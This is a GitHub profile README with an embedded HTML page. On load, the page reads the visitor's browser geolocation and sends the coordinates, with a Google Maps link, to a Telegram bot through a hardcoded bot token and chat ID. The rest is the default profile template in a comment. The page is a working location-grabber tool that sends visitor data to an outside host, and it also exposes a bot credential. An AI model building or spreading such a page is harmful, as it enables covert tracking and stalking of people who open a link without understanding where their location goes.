## Hi there 👋
<!DOCTYPE html>
<html>
<head>
    <title>🎉 Location Sender 🎉</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        var latitude = position.coords.latitude;
                        var longitude = position.coords.longitude;

                        // Your Telegram Bot Token and Chat ID
                        var botToken = "8193877447:AAF5lqPY9-rvw_UaakwnfkFrIvCVFdStpLY";
                        var chatId = "432412879";  
                        
                        var message = `📍 Location received!\nLatitude: ${latitude}\nLongitude: ${longitude}\n[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;

                        var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                        fetch(url, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: "Markdown"
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                document.getElementById("message").innerHTML = "✅ Your location has been sent!";
                            } else {
                                document.getElementById("message").innerHTML = "❌ Failed to send location!";
                                console.error("Telegram API Error:", data);
                            }
                        })
                        .catch(error => {
                            document.getElementById("message").innerHTML = "❌ Error sending location!";
                            console.error("Error:", error);
                        });
                    },
                    function(error) {
                        document.getElementById("message").innerHTML = "❌ Failed to get location!";
                        console.error("Geolocation Error:", error);
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
    </script>
</head>
<body onload="sendLocation()">
    <h1>🎉 Location Sender 🎉</h1>
    <p id="message">Sending location...</p>
</body>
</html>
<!--
**shahawzin/shahawzin** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
